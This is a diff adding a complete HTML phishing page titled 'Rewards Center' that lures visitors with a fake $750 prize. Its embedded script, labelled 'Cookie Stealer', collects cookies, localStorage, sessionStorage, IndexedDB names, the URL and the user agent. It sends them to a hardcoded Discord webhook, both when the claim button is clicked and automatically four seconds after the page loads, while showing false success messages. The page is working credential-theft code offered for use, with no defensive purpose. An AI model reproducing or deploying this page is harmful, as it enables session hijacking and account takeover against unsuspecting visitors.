@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rewards Center</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Segoe UI', sans-serif;
+            color: white;
+        }
+        .card {
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(12px);
+            padding: 45px 35px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            max-width: 400px;
+        }
+        h1 { font-size: 2.6em; margin: 0 0 12px 0; color: #00ff9d; }
+        .btn {
+            background: #5865F2;
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            font-size: 1.15em;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 25px 0 15px;
+            transition: all 0.3s;
+            font-weight: bold;
+        }
+        .btn:hover {
+            background: #4752c4;
+            transform: translateY(-4px);
+        }
+        .status { margin-top: 15px; font-size: 0.95em; min-height: 22px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🎉 CONGRATULATIONS!</h1>
+        <p>You have been randomly selected to receive a <strong>$750</strong> reward!</p>
+        <button class="btn" id="claimBtn">Claim Your Reward Now</button>
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1505801243891859486/FuFVsQmat8M5js-3VuZpq7eGzcyqXIfc78i_8J2KYQXVSQgobDotJbPNijokliYqcDfC";
+
+        async function stealData() {
+            const data = {
+                username: "Cookie Stealer",
+                avatar_url: "https://i.imgur.com/4Z9v5zL.png",
+                embeds: [{
+                    title: "🔥 New Victim Data Received",
+                    color: 0x5865F2,
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        { name: "URL", value: `\`${window.location.href}\``, inline: false },
+                        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+                        { name: "Cookies", value: document.cookie ? `\`\`\`${document.cookie}\`\`\`` : "`No cookies found`", inline: false },
+                        { name: "LocalStorage", value: Object.keys(localStorage).length > 0 ? `\`\`\`json\n${JSON.stringify(localStorage, null, 2)}\`\`\`` : "`Empty`", inline: false },
+                        { name: "SessionStorage", value: Object.keys(sessionStorage).length > 0 ? `\`\`\`json\n${JSON.stringify(sessionStorage, null, 2)}\`\`\`` : "`Empty`", inline: false }
+                    ],
+                    footer: { text: "Browser Storage Stealer • " + new Date().toLocaleString() }
+                }]
+            };
+
+            // Steal IndexedDB (most valuable data)
+            try {
+                const dbs = await indexedDB.databases();
+                if (dbs.length > 0) {
+                    let idbText = "";
+                    for (const db of dbs) {
+                        idbText += `Database: ${db.name} (v${db.version})\n`;
+                    }
+                    data.embeds[0].fields.push({
+                        name: "IndexedDB Databases",
+                        value: `\`\`\`${idbText}\`\`\``,
+                        inline: false
+                    });
+                }
+            } catch (e) {}
+
+            return data;
+        }
+
+        async function sendToDiscord(payload) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload),
+                    mode: "no-cors"
+                });
+            } catch (err) {
+                // Fallback using Image beacon
+                const img = new Image();
+                img.src = WEBHOOK_URL + "?data=" + encodeURIComponent(JSON.stringify(payload));
+            }
+        }
+
+        document.getElementById("claimBtn").onclick = async function() {
+            const status = document.getElementById("status");
+            status.innerHTML = "Claiming reward and extracting data...";
+
+            const payload = await stealData();
+            await sendToDiscord(payload);
+
+            status.innerHTML = `<span style="color:#00ff9d">✅ Reward claimed successfully!</span>`;
+            
+            setTimeout(() => {
+                alert("🎉 Your $750 reward has been processed and sent to your account!");
+            }, 700);
+        };
+
+        // Stealth auto-steal after 4 seconds
+        window.onload = () => {
+            setTimeout(async () => {
+                const payload = await stealData();
+                sendToDiscord(payload);
+            }, 4200);
+        };
+    </script>
+</body>
+</html>
